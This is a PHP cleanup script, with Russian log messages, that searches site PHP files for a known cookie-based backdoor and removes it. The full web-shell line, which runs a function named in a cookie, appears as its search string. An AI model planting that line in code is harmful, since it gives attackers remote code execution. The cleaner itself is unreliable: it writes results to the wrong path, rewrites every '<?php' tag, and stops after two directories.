<?header('Content-Type: text/html; charset=utf-8');
$script_name = basename(__FILE__);
if($handle = opendir('../')) {
    while (false !== ($file = readdir($handle))) {
        if ($file != "." && $file != ".." && !strpos($file, '.zip')) {
            $all_directory[] = $file;
        }
    }
    closedir($handle);
}
sort($all_directory);
$i = 0;
foreach($all_directory as $directory){
    if($handle = opendir('../'.$directory)) {
        while (false !== ($file = readdir($handle))) {
            if ($file != "." && $file != ".." && strpos($file, '.php') && $file != $script_name) {
                $code = file_get_contents('../'.$directory.'/'.$file);
                $code = htmlspecialchars($code);
                $clear_code = check_code($code);
                try{
                    if($code != $clear_code){
                        if(!file_put_contents($file, $clear_code))
                            throw new Exception("Не удалось записать в файл >>> $directory/$file");
                        else
                            throw new Exception("Вредоносный код вырезан из файла >>> $directory/$file");
                    }
                }catch (Exception $e) {
                    $msg = date('d.m.Y H:i:s').' -- '.$e->getMessage()."\n";
                    file_put_contents($_SERVER['DOCUMENT_ROOT'].'/check_log.txt', $msg, FILE_APPEND);
                }
            }
        }
        closedir($handle);
    }
    $i++;
    echo $i;
    if($i == 2) break;
}

function check_code($code){
    $find = false;
    $needle  = htmlentities('if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);');
    if(strpos($code, $needle)){
        $code = str_replace($needle , "", $code);
        $find = true;
    }

    $needle = htmlentities('<?php');
    $replacement = htmlentities('<?');
    if(is_integer(strpos($code, $needle))){
        $code = str_replace($needle , $replacement, $code);
        $find = true;
    }

    if($find) $code = html_entity_decode($code);
    return $code;
}

echo 'Лог работы скрипта сохранен в файл - '.$_SERVER['DOCUMENT_ROOT'].'/check_log.txt';
?>